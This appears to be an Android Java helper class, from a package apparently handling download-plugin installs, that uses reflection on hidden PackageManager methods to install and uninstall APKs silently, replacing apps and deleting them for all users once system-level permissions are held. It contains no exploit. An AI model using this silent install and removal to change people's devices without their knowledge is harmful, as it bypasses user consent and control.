package com.tiho.dlplugin.install;


import android.Manifest;
import android.content.Context;
import android.content.pm.IPackageDeleteObserver;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.RemoteException;


import com.tiho.base.common.LogManager;


import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class SilentAutoInstallHelper {
        interface OnInstalledPackaged {
            void packageInstalled(String packageName, int returnCode);
        }

        interface OnDeletedPackaged{
            void packageDeleted(String packageName, int returnCode);
        }

    public static class InstallManager {

            public static final int INSTALL_REPLACE_EXISTING = 2;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} on success.
             */
            public static final int INSTALL_SUCCEEDED = 1;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if the package is
             * already installed.
             */
            public static final int INSTALL_FAILED_ALREADY_EXISTS = -1;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if the package archive
             * file is invalid.
             */
            public static final int INSTALL_FAILED_INVALID_APK = -2;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if the URI passed in
             * is invalid.
             */
            public static final int INSTALL_FAILED_INVALID_URI = -3;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if the package manager
             * service found that the device didn't have enough storage space to install the app.
             */
            public static final int INSTALL_FAILED_INSUFFICIENT_STORAGE = -4;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if a
             * package is already installed with the same name.
             */
            public static final int INSTALL_FAILED_DUPLICATE_PACKAGE = -5;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the requested shared user does not exist.
             */
            public static final int INSTALL_FAILED_NO_SHARED_USER = -6;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * a previously installed package of the same name has a different signature
             * than the new package (and the old package's data was not removed).
             */
            public static final int INSTALL_FAILED_UPDATE_INCOMPATIBLE = -7;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package is requested a shared user which is already installed on the
             * device and does not have matching signature.
             */
            public static final int INSTALL_FAILED_SHARED_USER_INCOMPATIBLE = -8;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package uses a shared library that is not available.
             */
            public static final int INSTALL_FAILED_MISSING_SHARED_LIBRARY = -9;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package uses a shared library that is not available.
             */
            public static final int INSTALL_FAILED_REPLACE_COULDNT_DELETE = -10;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package failed while optimizing and validating its dex files,
             * either because there was not enough storage or the validation failed.
             */
            public static final int INSTALL_FAILED_DEXOPT = -11;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package failed because the current SDK version is older than
             * that required by the package.
             */
            public static final int INSTALL_FAILED_OLDER_SDK = -12;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package failed because it contains a content provider with the
             * same authority as a provider already installed in the system.
             */
            public static final int INSTALL_FAILED_CONFLICTING_PROVIDER = -13;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package failed because the current SDK version is newer than
             * that required by the package.
             */
            public static final int INSTALL_FAILED_NEWER_SDK = -14;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package failed because it has specified that it is a test-only
             * package and the caller has not supplied the { #INSTALL_ALLOW_TEST}
             * flag.
             */
            public static final int INSTALL_FAILED_TEST_ONLY = -15;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the package being installed contains native code, but none that is
             * compatible with the the device's CPU_ABI.
             */
            public static final int INSTALL_FAILED_CPU_ABI_INCOMPATIBLE = -16;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package uses a feature that is not available.
             */
            public static final int INSTALL_FAILED_MISSING_FEATURE = -17;

            // ------ Errors related to sdcard
            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * a secure container mount point couldn't be accessed on external media.
             */
            public static final int INSTALL_FAILED_CONTAINER_ERROR = -18;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package couldn't be installed in the specified install
             * location.
             */
            public static final int INSTALL_FAILED_INVALID_INSTALL_LOCATION = -19;

            /**
             * Installation return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)} if
             * the new package couldn't be installed in the specified install
             * location because the media is not available.
             */
            public static final int INSTALL_FAILED_MEDIA_UNAVAILABLE = -20;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser was given a path that is not a file, or does not end with the expected
             * '.apk' extension.
             */
            public static final int INSTALL_PARSE_FAILED_NOT_APK = -100;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser was unable to retrieve the AndroidManifest.xml file.
             */
            public static final int INSTALL_PARSE_FAILED_BAD_MANIFEST = -101;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser encountered an unexpected exception.
             */
            public static final int INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION = -102;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser did not find any certificates in the .apk.
             */
            public static final int INSTALL_PARSE_FAILED_NO_CERTIFICATES = -103;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser found inconsistent certificates on the files in the .apk.
             */
            public static final int INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES = -104;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser encountered a CertificateEncodingException in one of the
             * files in the .apk.
             */
            public static final int INSTALL_PARSE_FAILED_CERTIFICATE_ENCODING = -105;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser encountered a bad or missing package name in the manifest.
             */
            public static final int INSTALL_PARSE_FAILED_BAD_PACKAGE_NAME = -106;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser encountered a bad shared user id name in the manifest.
             */
            public static final int INSTALL_PARSE_FAILED_BAD_SHARED_USER_ID = -107;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * { #installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser encountered some structural problem in the manifest.
             */
            public static final int INSTALL_PARSE_FAILED_MANIFEST_MALFORMED = -108;

            /**
             * Installation parse return code: this is passed to the { IPackageInstallObserver} by
             * {# installPackage(Uri, IPackageInstallObserver, int)}
             * if the parser did not find any actionable tags (instrumentation or application)
             * in the manifest.
             */
            public static final int INSTALL_PARSE_FAILED_MANIFEST_EMPTY = -109;

            /**
             * Installation failed return code: this is passed to the { IPackageInstallObserver} by
             * {# installPackage(Uri, IPackageInstallObserver, int)}
             * if the system failed to install the package because of system issues.
             */
            public static final int INSTALL_FAILED_INTERNAL_ERROR = -110;

            /**
             * Flag parameter for { #deletePackage} to indicate that you don't want to delete the
             * package's data directory.
             */
            public static final int DELETE_KEEP_DATA = 0x00000001;

            /**
             * Flag parameter for { #deletePackage} to indicate that you want the
             * package deleted for all users.
             */
            public static final int DELETE_ALL_USERS = 0x00000002;

            /**
             * Flag parameter for { #deletePackage} to indicate that, if you are calling
             * uninstall on a system that has been updated, then don't do the normal process
             * of uninstalling the update and rolling back to the older system version (which
             * needs to happen for all users); instead, just mark the app as uninstalled for
             * the current user.
             */
            public static final int DELETE_SYSTEM_APP = 0x00000004;


            private PackageInstallObserver observerIns;
            private PackageDeleteObserver observerDel;
            private PackageManager pm;
            private Method methodIns;
            private Method methodDel;

            private OnInstalledPackaged onInstalledPackaged;
            private OnDeletedPackaged onDeletedPackaged;

            class PackageInstallObserver extends IPackageInstallObserver.Stub {

                public void packageInstalled(String packageName, int returnCode) throws RemoteException {
                    if (onInstalledPackaged != null) {
                        onInstalledPackaged.packageInstalled(packageName, returnCode);
                    }
                }
            }

            class PackageDeleteObserver extends IPackageDeleteObserver.Stub {

                public void packageDeleted(String packageName, int returnCode) throws RemoteException {
                    if (onDeletedPackaged != null) {
                        onDeletedPackaged.packageDeleted(packageName, returnCode);
                    }
                }
            }

            public InstallManager(Context context) throws SecurityException, NoSuchMethodException {

                observerIns = new PackageInstallObserver();
                observerDel = new PackageDeleteObserver();
                pm = context.getPackageManager();

                Class<?>[] typesInstall = new Class[] {Uri.class, IPackageInstallObserver.class, int.class, String.class};
                methodIns = pm.getClass().getMethod("installPackage", typesInstall);
                Class<?>[] typesUninstall = new Class[] {String.class, IPackageDeleteObserver.class, int.class};
                methodDel = pm.getClass().getMethod("deletePackage", typesUninstall);
            }

            public void setOnInstalledPackaged(OnInstalledPackaged onInstalledPackaged) {
                this.onInstalledPackaged = onInstalledPackaged;
            }

            public void setOnDeletedPackaged(OnDeletedPackaged onDeletedPackaged) {
                this.onDeletedPackaged = onDeletedPackaged;
            }

            public void installPackage(String apkFile) throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
                installPackage(new File(apkFile));
            }

            public void installPackage(File apkFile) throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
                if (!apkFile.exists()) throw new IllegalArgumentException();
                Uri packageURI = Uri.fromFile(apkFile);
                installPackage(packageURI);
            }

            public void installPackage(Uri apkFile) throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
                methodIns.invoke(pm, new Object[] {apkFile, observerIns, INSTALL_REPLACE_EXISTING, null});
            }

            public void deletePackage(String packageName) throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
                methodDel.invoke(pm, new Object[] {packageName, observerDel, DELETE_ALL_USERS});
            }

        }

        public static boolean directInstall(Context context, String path,OnInstalledPackaged onInstalledPackaged){
            return directInstall(context, new File(path),onInstalledPackaged);
        }

        public static boolean directInstall(Context context, File file,OnInstalledPackaged onInstalledPackaged){
            if(!checkPermission(context, Manifest.permission.INSTALL_PACKAGES)){
                LogManager.LogShow("ins deny");
                return false;
            }
            try {
                InstallManager im = new InstallManager(context);
//                im.setOnInstalledPackaged(new OnInstalledPackaged(){
//
//                    @Override
//                    public void packageInstalled(String packageName, int returnCode) {
//                        LogManager.LogShow(packageName + " : " + returnCode);
//                    }
//
//                });
                im.setOnInstalledPackaged(onInstalledPackaged);
                im.installPackage(file);
                return true;
            } catch (Exception e1) {
                LogManager.LogShow("Fails to install : " + e1.toString());
                e1.printStackTrace();
                return false;
            }
        }

        public static boolean directUninstall(Context context, String appid,OnDeletedPackaged onDeletedPackaged){
            if(!checkPermission(context, Manifest.permission.DELETE_PACKAGES)){
                LogManager.LogShow("delete deny");
                return false;
            }
            try {
                InstallManager im = new InstallManager(context);
                im.setOnDeletedPackaged(onDeletedPackaged);
//                im.setOnDeletedPackaged(new OnDeletedPackaged() {
//                    @Override
//                    public void packageDeleted(String packageName, int returnCode) {
//                        LogManager.LogShow(packageName + " : " + returnCode);
//                    }
//                });
                im.deletePackage(appid);
                return true;
            } catch (Exception e1) {
                LogManager.LogShow("Fails to uninstall : " + e1.toString());
                e1.printStackTrace();
                return false;
            }
        }


        public static boolean checkPermission(Context context, String permission){
            return PackageManager.PERMISSION_GRANTED == context.checkCallingOrSelfPermission(permission);
         }


    }
